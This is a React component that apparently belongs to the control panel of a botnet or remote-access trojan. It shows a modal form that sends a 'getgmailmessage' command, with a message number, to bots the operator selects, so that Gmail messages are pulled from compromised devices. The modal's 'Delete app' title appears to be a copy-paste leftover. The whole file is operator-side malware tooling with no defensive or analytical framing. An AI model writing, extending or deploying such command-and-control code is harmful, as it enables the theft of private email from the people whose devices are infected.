import React from "react";
import {ModalWithSelectedBotsProps} from "../../../Model/Modal";
import {Form, Input, Modal} from "antd";
import {getBotsId} from "../../../Util/getBotIds";
import sendCommand from "../../../Requests/Commands/sendCommands";

const GetGmailMessages: React.FC<ModalWithSelectedBotsProps> = (props: ModalWithSelectedBotsProps) => {
    const [form] = Form.useForm();

    const closeModal = () => {
        props.setVisible(false);
        form.resetFields();
    };

    form.setFieldsValue({
        mes_num: 0,
    });

    const formSubmit = () => {
        sendCommand({
            command: "getgmailmessage",
            payload: {
                mes_num: form.getFieldValue("mes_num"),
            },
            botIds: getBotsId(props.selectedBots),
        });

        closeModal();
    };

    return (
        <Modal
            title="Delete app"
            visible={props.visible}
            onCancel={closeModal}
            onOk={() => form.submit()}
            okText="Send"
            width={340}
            destroyOnClose
        >
            <Form form={form} layout="vertical" onFinish={formSubmit}>
                <Form.Item label="Message Number" name="mes_num">
                    <Input type={"number"} />
                </Form.Item>
            </Form>
        </Modal>
    );
};

export default GetGmailMessages;
